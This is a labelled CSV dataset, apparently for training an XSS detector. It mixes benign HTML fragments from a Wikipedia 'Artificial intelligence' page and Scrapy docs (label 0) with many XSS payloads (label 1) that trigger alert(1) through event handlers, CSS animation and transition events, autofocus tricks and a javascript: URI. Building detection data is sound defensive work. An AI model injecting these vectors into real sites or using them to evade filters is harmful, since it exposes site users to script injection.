,kod,label
702,<input onpointerup=alert(1)>XSS</input>,1
703,"	 </span> </h4>",0
704,"<li><a href=""/wiki/Humberto_Maturana"" title=""Humberto Maturana"">Humberto Maturana </a> </li>",0
705," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Early modern </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
706,<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,1
707,<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,1
708,"<li><a class=""mw-selflink selflink"">Artificial intelligence </a>",0
709,"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",1
710,"<u ondblclick=""alert(1)"">test</u>",1
711,"	 </span> <span class=""reference-text"">",0
712,"<td onmouseover=""alert(1)"">test</td>",1
713,"<li><a href=""/wiki/History_of_evolutionary_thought"" title=""History of evolutionary thought"">History of evolutionary thought </a> </li>",0
714,"<option onkeydown=""alert(1)"" contenteditable>test</option>",1
715, ,0
716,<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,1
717,"<dl onkeydown=""alert(1)"" contenteditable>test</dl>",1
718,"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dir>",1
719,"<ul><li><a href=""/wiki/Hexapod_(robotics)"" title=""Hexapod (robotics)"">Hexapod </a> </li> </ul> </li>",0
720,"	 </span> 2019 ",0
721,"<li><a href=""/wiki/Data_mining"" title=""Data mining"">Data mining </a> </li>",0
722,"	 </span></a></dt><dd>See all available signals and how to work with them.</dd>",0
723,"<canvas onmouseup=""alert(1)"">test</canvas>",1
724,"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",1
725,"<b onmouseup=""alert(1)"">test</b>",1
726,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Hernández-Orallo, José; Dowe, David L.; Hernández-Lloreda, M.Victoria (March 2014). ""Universal psychometrics: Measuring cognitive abilities in the machine kingdom"". <i>Cognitive Systems Research </i>. <b>27 </b>: 50–74. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2013.06.001"">10.1016/j.cogsys.2013.06.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/10251%2F50244"">10251/50244 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=Universal+psychometrics%3A+Measuring+cognitive+abilities+in+the+machine+kingdom&amp;rft.volume=27&amp;rft.pages=50-74&amp;rft.date=2014-03&amp;rft_id=info%3Ahdl%2F10251%2F50244&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2013.06.001&amp;rft.aulast=Hern%C3%A1ndez-Orallo&amp;rft.aufirst=Jos%C3%A9&amp;rft.au=Dowe%2C+David+L.&amp;rft.au=Hern%C3%A1ndez-Lloreda%2C+M.Victoria&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
727,"<rtc onmouseup=""alert(1)"">test</rtc>",1
728,"<object data=""javascript:alert()"">",1
729,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
730," 	<sup id=""cite_ref-Emotion_and_affective_computing_144-0"" class=""reference""><a href=""#cite_note-Emotion_and_affective_computing-144"">&#91;141&#93; </a> </sup> Similarly, some <a href=""/wiki/Virtual_assistant"" title=""Virtual assistant"">virtual assistants </a> are programmed to speak conversationally or even to banter humorously; this tends to give naïve users an unrealistic conception of how intelligent existing computer agents actually are.<sup id=""cite_ref-145"" class=""reference""><a href=""#cite_note-145"">&#91;142&#93; </a> </sup>",0
731,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 									0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1
732,"<li><a href=""/wiki/Application_security"" title=""Application security"">Application security </a> </li> </ul>",0
733, </li>,0
734,"<template onkeydown=""alert(1)"" contenteditable>test</template>",1
735,"<li id=""cite_note-Eleanor-315""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Eleanor_315-0"">^ </a> </b> ",0
736,"<marquee oncut=""alert(1)"" contenteditable>test</marquee>",1
737,"<sub onmouseup=""alert(1)"">test</sub>",1
738," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Robot_locomotion"" title=""Robot locomotion"">Locomotion </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
739,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Cadena, Cesar; Carlone, Luca; Carrillo, Henry; Latif, Yasir; Scaramuzza, Davide; Neira, Jose; Reid, Ian; Leonard, John J. (December 2016). ""Past, Present, and Future of Simultaneous Localization and Mapping: Toward the Robust-Perception Age"". <i>IEEE Transactions on Robotics </i>. <b>32 </b> (6): 1309–1332. <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1606.05830"">1606.05830 </a> ",0
740,"<rb onmouseleave=""alert(1)"">test</rb>",1
741,"	 </span> 2018 ",0
742, </p>,0
743,"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",1
744,"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",1
745,"	 </span> </li>",0
746,"<title ondblclick=""alert(1)"">test</title>",1
747,"	 </span> <span class=""reference-text""><a href=""/wiki/Rina_Dechter"" title=""Rina Dechter"">Rina Dechter </a> (1986). Learning while searching in constraint-satisfaction problems. University of California, Computer Science Department, Cognitive Systems Laboratory.<a rel=""nofollow"" class=""external text"" href=""https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160419054654/https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems"">Archived </a> 19 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0
748,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=15"" title=""Edit section: Cybernetics and brain simulation"">edit </a>",0
749,"<param onkeypress=""alert(1)"" contenteditable>test</param>",1
750,<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,1
751,"	 </span> <span class=""toctext"">Planning ",0
752,"<li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge representation and reasoning </a> </li>",0
753,<optgroup onpointerleave=alert(1)>XSS</optgroup>,1
754,"    <span class=""rst-current-version"" data-toggle=""rst-current-version"">",0
755,"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",1
756,"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/examples.html"">Examples</a></li>",0
757,"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",1
758,<strong id=x tabindex=1 onfocusin=alert(1)></strong>,1
759,"<li><a href=""/wiki/Fitness_landscape"" title=""Fitness landscape"">Fitness landscape </a> </li>",0
760,"			<ul><li id=""n-mainpage-description""><a href=""/wiki/Main_Page"" title=""Visit the main page [z]"" accesskey=""z"">Main page </a> </li><li id=""n-contents""><a href=""/wiki/Wikipedia:Contents"" title=""Guides to browsing Wikipedia"">Contents </a> </li><li id=""n-featuredcontent""><a href=""/wiki/Wikipedia:Featured_content"" title=""Featured content – the best of Wikipedia"">Featured content </a> </li><li id=""n-currentevents""><a href=""/wiki/Portal:Current_events"" title=""Find background information on current events"">Current events </a> </li><li id=""n-randompage""><a href=""/wiki/Special:Random"" title=""Load a random article [x]"" accesskey=""x"">Random article </a> </li><li id=""n-sitesupport""><a href=""https://donate.wikimedia.org/wiki/Special:FundraiserRedirector?utm_source=donate&amp;utm_medium=sidebar&amp;utm_campaign=C13_en.wikipedia.org&amp;uselang=en"" title=""Support us"">Donate to Wikipedia </a> </li><li id=""n-shoplink""><a href=""//shop.wikimedia.org"" title=""Visit the Wikipedia store"">Wikipedia store </a> </li> </ul>",0
761,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=23"" title=""Edit section: Computational intelligence and soft computing"">edit </a><span class=""mw-editsection-bracket"">] ",0
762,<svg><option onload=alert(1)></option>,1
763,"<li class=""toclevel-1 tocsection-48""><a href=""#Philosophy_and_ethics""><span class=""tocnumber"">8 ",0
764,"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",1
765,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",1
766,"<li class=""toclevel-2 tocsection-21""><a href=""#Sub-symbolic""><span class=""tocnumber"">5.3 ",0
767,"<header onbeforecopy=""alert(1)"" contenteditable>test</header>",1
768,"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noembed>",1
769,"<li><a href=""/wiki/Software_quality"" title=""Software quality"">Software quality </a> </li> </ul>",0
770,"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",1
771,"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",1
772,<summary onpointerdown=alert(1)>XSS</summary>,1
773, </li>,0
774,"	 <div class=""magnify""><a href=""/wiki/File:Overfitted_Data.png"" class=""internal"" title=""Enlarge""> </a> </div>The blue line could be an example of <a href=""/wiki/Overfitting"" title=""Overfitting"">overfitting </a> a linear function due to random noise. </div> </div> </div>",0
775,<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>,1
776,"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",1
777,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
778,"<canvas draggable=""true"" ondragend=""alert(1)"">test</canvas>",1
779,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=SearchERP&amp;rft.atitle=Oracle+CEO+Mark+Hurd+sees+no+reason+to+fear+ERP+AI&amp;rft_id=https%3A%2F%2Fsearcherp.techtarget.com%2Fnews%2F252460208%2FOracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
780,"<li id=""cite_note-Physical_symbol_system_hypothesis-353""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Physical_symbol_system_hypothesis_353-0"">^ </a> </b> ",0
781,"<content onmousemove=""alert(1)"">test</content>",1
782,<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,1
783,"<li class=""toclevel-2 tocsection-7""><a href=""#Planning""><span class=""tocnumber"">4.3 ",0
784,"<div id=""mw-indicator-pp-autoreview"" class=""mw-indicator"">",0
785,"<li><a href=""/wiki/List_of_fictional_robots_and_androids"" title=""List of fictional robots and androids"">Fictional robots </a> </li> </ul>",0
786,"<acronym onmouseup=""alert(1)"">test</acronym>",1
787, </li>,0
788,"<li><a href=""/wiki/Human-based_evolutionary_computation"" title=""Human-based evolutionary computation"">Human-based evolutionary computation </a> </li>",0
789,"<li class=""toctree-l1""><a class=""reference internal"" href=""versioning.html"">Versioning and API Stability</a></li>",0
790,<p onpointerenter=alert(1)>XSS</p>,1
791,"<li><a href=""/wiki/Philosophical_zombie"" title=""Philosophical zombie"">Zombie </a> </li>",0
792,<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>,1
793,"	 </span> <span class=""reference-text""><cite class=""citation web"">Rowinski, Dan (15 January 2013). <a rel=""nofollow"" class=""external text"" href=""http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic"">""Virtual Personal Assistants &amp; The Future Of Your Smartphone &#91;Infographic&#93;"" </a>. <i>ReadWrite </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151222083034/http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic"">Archived </a> from the original on 22 December 2015. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ReadWrite&amp;rft.atitle=Virtual+Personal+Assistants+%26+The+Future+Of+Your+Smartphone+%5BInfographic%5D&amp;rft.date=2013-01-15&amp;rft.au=Rowinski%2C+Dan&amp;rft_id=http%3A%2F%2Freadwrite.com%2F2013%2F01%2F15%2Fvirtual-personal-assistants-the-future-of-your-smartphone-infographic&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
794,"	 </span>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070810233856/http://www-formal.stanford.edu/jmc/mcchay69.html"">Archived </a> from the original on 10 August 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 August ",0
795,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Automated planning and scheduling </a> </div>",0
796,"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",1
797,"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",1
798,"		<div id=""siteSub"" class=""noprint"">From Wikipedia, the free encyclopedia </div>",0
799,"<marquee draggable=""true"" ondrag=""alert(1)"">test</marquee>",1
800,"<em oncontextmenu=""alert(1)"">test</em>",1
801,<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,1
802,"<ruby onmouseleave=""alert(1)"">test</ruby>",1
803,"<li><a class=""mw-selflink selflink"">Artificial intelligence </a> </li>",0
804,<applet onpointermove=alert(1)>XSS</applet>,1
805,"<li><a href=""/wiki/Future_of_Life_Institute"" title=""Future of Life Institute"">Future of Life Institute </a> </li>",0
806,"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",1
807,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3 </li> </ul>",0
808,"<kbd onmouseleave=""alert(1)"">test</kbd>",1
809,"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",1
810," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
811,"	 </span>",0
812,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
813, </li>,0
814,"	 </span> 2018 ",0
815,<article id=x tabindex=1 onactivate=alert(1)></article>,1
816,"	 </span> <span class=""reference-text""><a href=""#CITEREFGladwell2005"">Gladwell 2005 </a>. ",0
817,<audio onpointerdown=alert(1)>XSS</audio>,1
818,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
819,"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",0
820,"<svg onbeforecopy=""alert(1)"" contenteditable>test</svg>",1
821," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Classifications </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
822,<map onpointermove=alert(1)>XSS</map>,1
823," </p><p>The traditional problems (or goals) of AI research include <a href=""/wiki/Automated_reasoning"" title=""Automated reasoning"">reasoning </a>, <a href=""/wiki/Knowledge_representation"" class=""mw-redirect"" title=""Knowledge representation"">knowledge representation </a>, <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">planning </a>, <a href=""/wiki/Machine_learning"" title=""Machine learning"">learning </a>, <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">natural language processing </a>, <a href=""/wiki/Machine_perception"" title=""Machine perception"">perception </a> and the ability to move and manipulate objects.<sup id=""cite_ref-Problems_of_AI_15-1"" class=""reference""><a href=""#cite_note-Problems_of_AI-15"">&#91;15&#93; </a> </sup> <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">General intelligence </a> is among the field's long-term goals.<sup id=""cite_ref-General_intelligence_19-0"" class=""reference""><a href=""#cite_note-General_intelligence-19"">&#91;19&#93; </a> </sup> Approaches include <a href=""#Statistical"">statistical methods </a>, <a href=""#Sub-symbolic"">computational intelligence </a>, and <a href=""#Symbolic"">traditional symbolic AI </a>. Many tools are used in AI, including versions of <a href=""#Search_and_optimization"">search and mathematical optimization </a>, <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural networks </a>, and <a href=""#Probabilistic_methods_for_uncertain_reasoning"">methods based on statistics, probability and economics </a>. The AI field draws upon <a href=""/wiki/Computer_science"" title=""Computer science"">computer science </a>, <a href=""/wiki/Information_engineering_(field)"" title=""Information engineering (field)"">information engineering </a>, <a href=""/wiki/Mathematics"" title=""Mathematics"">mathematics </a>, <a href=""/wiki/Psychology"" title=""Psychology"">psychology </a>, <a href=""/wiki/Linguistics"" title=""Linguistics"">linguistics </a>, <a href=""/wiki/Philosophy"" title=""Philosophy"">philosophy </a>, and many other fields.",0
824,<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,1
825,"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",1
826, ,0
827,"	 </span> </h4>",0
828,"<h1 draggable=""true"" ondrag=""alert(1)"">test</h1>",1
829,"<li><cite id=""CITEREFWeizenbaum1976"" class=""citation book""><a href=""/wiki/Joseph_Weizenbaum"" title=""Joseph Weizenbaum"">Weizenbaum, Joseph </a> (1976). <a href=""/wiki/Computer_Power_and_Human_Reason"" title=""Computer Power and Human Reason""><i>Computer Power and Human Reason </i> </a>. San Francisco: W.H. Freeman &amp; Company. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-7167-0464-5"" title=""Special:BookSources/978-0-7167-0464-5""><bdi>978-0-7167-0464-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Computer+Power+and+Human+Reason&amp;rft.place=San+Francisco&amp;rft.pub=W.H.+Freeman+%26+Company&amp;rft.date=1976&amp;rft.isbn=978-0-7167-0464-5&amp;rft.aulast=Weizenbaum&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
830,<abbr onpointerover=alert(1)>XSS</abbr>,1
831,"	 </span> <span class=""reference-text"">",0
832,       </div>,0
833,"<time onbeforecut=""alert(1)"" contenteditable>test</time>",1
834,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race"">""Google leads in the race to dominate artificial intelligence"" </a>. <i>The Economist </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0
835,"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",1
836,"<h3><span class=""mw-headline"" id=""Automotive"">Automotive ",0
837,"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0
838,"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",1
839,"<applet onclick=""alert(1)"">test</applet>",1
840, ,0
841,"	 </span> 2018 ",0
842,"	 </span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://dl.acm.org/citation.cfm?id=3204480.3186697"">Retrieved July 29 </a> ",0
843,"<dt onmouseover=""alert(1)"">test</dt>",1
844,"	 </span></a></dt>",0
845,"	 <div class=""magnify""><a href=""/wiki/File:Didrachm_Phaistos_obverse_CdM.jpg"" class=""internal"" title=""Enlarge""> </a> </div>Silver <a href=""/wiki/Didrachma"" class=""mw-redirect"" title=""Didrachma"">didrachma </a> from <a href=""/wiki/Crete"" title=""Crete"">Crete </a> depicting <a href=""/wiki/Talos"" title=""Talos"">Talos </a>, an ancient mythical <a href=""/wiki/Automaton"" title=""Automaton"">automaton </a> with artificial intelligence </div> </div> </div>",0
846,"<nextid draggable=""true"" ondrag=""alert(1)"">test</nextid>",1
847,"	 </ul>",0
848,"<hgroup onkeyup=""alert(1)"" contenteditable>test</hgroup>",1
849,"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",1
850,<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,1
851,<svg onpointerenter=alert(1)>XSS</svg>,1
852,"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",1
853,"<tbody onmouseup=""alert(1)"">test</tbody>",1
854,"<rt onmousemove=""alert(1)"">test</rt>",1
855,</div>,0
856,<input3 onpointerout=alert(1)>XSS</input3>,1
857,"<meta onclick=""alert(1)"">test</meta>",1
858,"	 </span> </li>",0
859,"<dialog onbeforepaste=""alert(1)"" contenteditable>test</dialog>",1
860,"<li>if a move ""forks"" to create two threats at once, play that move. Otherwise, </li>",0
861,"<map onmouseout=""alert(1)"">test</map>",1
862,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;462–644, </li>",0
863,"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frameset>",1
864,"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",1
865,"	 </span></a></dt><dd>Learn more by playing with a pre-made Scrapy project.</dd>",0
866,"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationstart=""alert(1)""></dt>",1
867,"<li id=""cite_note-311""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-311"">^ </a> </b> ",0
868,"<li><a href=""/wiki/Science_studies"" title=""Science studies"">Science studies </a> </li>",0
869,"	 </span> <span class=""reference-text"">""The Belief Calculus and Uncertain Reasoning"", Yen-Teh Hsia ",0
870,"<footer oncut=""alert(1)"" contenteditable>test</footer>",1
871,"<li><a href=""/wiki/Mind%E2%80%93body_dualism"" title=""Mind–body dualism"">Mind–body dualism </a> </li>",0
872,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=37"" title=""Edit section: Automotive"">edit </a><span class=""mw-editsection-bracket"">] ",0
873,<q id=x tabindex=1 onfocus=alert(1)></q>,1
874,"<b onmousedown=""alert(1)"">test</b>",1
875,"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",1
876,<tr id=x tabindex=1 onactivate=alert(1)></tr>,1
877,"<ul><li><a href=""/wiki/Immanuel_Kant"" title=""Immanuel Kant"">Immanuel Kant </a> </li>",0
878,<slot onpointermove=alert(1)>XSS</slot>,1
879,"<li><a href=""/wiki/Concept_and_object"" title=""Concept and object"">Concept and object </a> </li>",0
880,"<datalist onmousedown=""alert(1)"">test</datalist>",1
881,<table id=x tabindex=1 onfocus=alert(1)></table>,1
882,"<li><a href=""/wiki/Network_scheduler"" title=""Network scheduler"">Network scheduler </a> </li>",0
883,"	 </span></a></dt><dd>Use the <a class=""reference external"" href=""https://docs.python.org/3/reference/compound_stmts.html#async"" title=""(in Python v3.8)""><span class=""xref std std-ref"">coroutine syntax",0
884,"<li><a href=""/wiki/Software-defined_radio"" title=""Software-defined radio"">Software-defined radio </a> </li>",0
885,"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",1
886,"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",1
887,"<li id=""cite_note-148""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-148"">^ </a> </b> ",0
888,"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",1
889,"	 <sup id=""cite_ref-132"" class=""reference""><a href=""#cite_note-132"">&#91;129&#93; </a> </sup> ",0
890,"<a oncopy=""alert(1)"" contenteditable>test</a>",1
891,<svg><li onload=alert(1)></li>,1
892,<iframe onpointerleave=alert(1)>XSS</iframe>,1
893,"<cite oncontextmenu=""alert(1)"">test</cite>",1
894,"<div class=""thumb tright"">",0
895,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=52"" title=""Edit section: Devaluation of humanity"">edit </a><span class=""mw-editsection-bracket"">] ",0
896,"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">Telnet Console",0
897,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> Later published as<br /><cite class=""citation book"">Solomonoff, Ray (1957). ""An Inductive Inference Machine"". <i>IRE Convention Record </i>. Section on Information Theory, part 2. pp.&#160;56–62. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=An+Inductive+Inference+Machine&amp;rft.btitle=IRE+Convention+Record&amp;rft.pages=56-62&amp;rft.date=1957&amp;rft.aulast=Solomonoff&amp;rft.aufirst=Ray&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
898,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
899,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=ACM+Computing+Classification+System%3A+Artificial+intelligence&amp;rft.pub=ACM&amp;rft.date=1998&amp;rft_id=http%3A%2F%2Fwww.acm.org%2Fclass%2F1998%2FI.2.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
900,"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",1
901," </p><p><a href=""/wiki/Isaac_Asimov"" title=""Isaac Asimov"">Isaac Asimov </a> introduced the <a href=""/wiki/Three_Laws_of_Robotics"" title=""Three Laws of Robotics"">Three Laws of Robotics </a> in many books and stories, most notably the ""Multivac"" series about a super-intelligent computer of the same name. Asimov's laws are often brought up during lay discussions of machine ethics;<sup id=""cite_ref-415"" class=""reference""><a href=""#cite_note-415"">&#91;403&#93; </a> </sup> while almost all artificial intelligence researchers are familiar with Asimov's laws through popular culture, they generally consider the laws useless for many reasons, one of which is their ambiguity.<sup id=""cite_ref-416"" class=""reference""><a href=""#cite_note-416"">&#91;404&#93; </a> </sup>",0
902,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
903,"	 </span> </li>",0
